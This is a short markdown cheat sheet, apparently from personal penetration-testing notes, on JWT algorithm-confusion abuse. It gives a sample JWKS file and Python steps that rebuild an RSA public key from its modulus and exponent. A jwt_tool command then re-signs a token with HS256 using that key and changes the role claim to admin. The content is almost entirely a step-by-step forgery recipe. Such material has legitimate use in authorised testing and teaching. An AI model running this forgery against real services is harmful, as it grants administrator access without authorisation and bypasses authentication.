---
title: "JWT"
date: 2025-7-25
tags: ["Jwt", "Jwks", "Cookies", "Cryptography", "Web Exploitation", "Token-Based Authentication"]
---

### Abuse #1: Algorithm Confusion

#### 0. Sample jwks.json

```console
{ 
    "keys": [
        {
        "kty": "RSA",
        "use": "sig",
        "alg": "RS256",
        "n": "<BASE64_n>",
        "e": "AQAB"
        }
    ]
}
```

#### 1. Create a Public Key

```console
# Invoking python interpreter
python3
```

```console
from base64 import urlsafe_b64decode
```

```console
from Crypto.PublicKey import RSA
```

```console
e = int.from_bytes(urlsafe_b64decode(b'AQAB'))
```

```console
n = int.from_bytes(urlsafe_b64decode(b'<BASE64_N>'))
```

```console
key = RSA.construct((n, e))
```

```console
# Save it to public.pem
print(key.exportKey().decode())
```

#### 2. Forge a jwt

```console
# For example, modify role to admin
python3 jwt_tool.py -S hs256 -k public.pem -I -pc role -pv admin <JWT>
```

<small>*Ref: [jwt_tool](https://github.com/ticarpi/jwt_tool)*</small>
